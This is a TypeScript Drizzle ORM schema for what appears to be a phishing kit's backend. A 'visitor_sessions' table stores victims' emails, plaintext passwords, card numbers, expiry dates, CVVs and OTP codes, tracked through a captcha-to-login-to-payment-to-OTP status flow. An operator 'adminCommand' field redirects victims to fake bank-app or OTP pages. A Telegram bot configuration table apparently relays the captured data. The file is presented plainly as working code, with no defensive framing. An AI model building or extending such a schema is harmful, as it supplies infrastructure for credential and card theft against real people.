import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, bigint } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// Visitor sessions table
export const visitorSessions = mysqlTable("visitor_sessions", {
  id: varchar("id", { length: 64 }).primaryKey(),
  ip: varchar("ip", { length: 64 }),
  country: varchar("country", { length: 128 }),
  city: varchar("city", { length: 128 }),
  zip: varchar("zip", { length: 32 }),
  countryCode: varchar("countryCode", { length: 8 }),
  userAgent: text("userAgent"),
  device: varchar("device", { length: 32 }).default("desktop"),
  status: mysqlEnum("status", [
    "captcha", "login", "payment", "bank_app", "otp", "approved", "declined", "invalid_otp", "blocked"
  ]).default("captcha").notNull(),
  adminCommand: mysqlEnum("adminCommand", [
    "none", "bank_app", "otp_page", "invalid_otp", "declined", "normal", "block"
  ]).default("none").notNull(),
  email: varchar("email", { length: 320 }),
  password: varchar("password", { length: 512 }),
  cardNumber: varchar("cardNumber", { length: 32 }),
  cardExpiry: varchar("cardExpiry", { length: 16 }),
  cardCvv: varchar("cardCvv", { length: 8 }),
  cardName: varchar("cardName", { length: 256 }),
  cardType: varchar("cardType", { length: 32 }),
  otp: varchar("otp", { length: 16 }),
  isOnline: int("isOnline").default(0).notNull(),
  lastSeen: bigint("lastSeen", { mode: "number" }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type VisitorSession = typeof visitorSessions.$inferSelect;
export type InsertVisitorSession = typeof visitorSessions.$inferInsert;

// Telegram config table
export const telegramConfig = mysqlTable("telegram_config", {
  id: int("id").autoincrement().primaryKey(),
  botToken: varchar("botToken", { length: 256 }).notNull(),
  chatId: varchar("chatId", { length: 64 }).notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type TelegramConfig = typeof telegramConfig.$inferSelect;